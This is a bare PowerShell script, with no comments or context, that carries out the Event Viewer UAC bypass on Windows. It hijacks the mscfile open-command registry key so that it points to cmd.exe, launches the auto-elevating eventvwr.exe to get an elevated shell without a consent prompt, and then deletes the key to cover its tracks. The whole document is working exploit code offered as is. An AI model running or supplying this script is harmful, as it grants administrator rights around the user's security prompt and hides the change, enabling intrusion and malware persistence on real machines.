New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value cmd.exe -Force
Start-Sleep -s 1
Start-Process "C:\Windows\System32\eventvwr.exe"
Start-Sleep -s 1
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force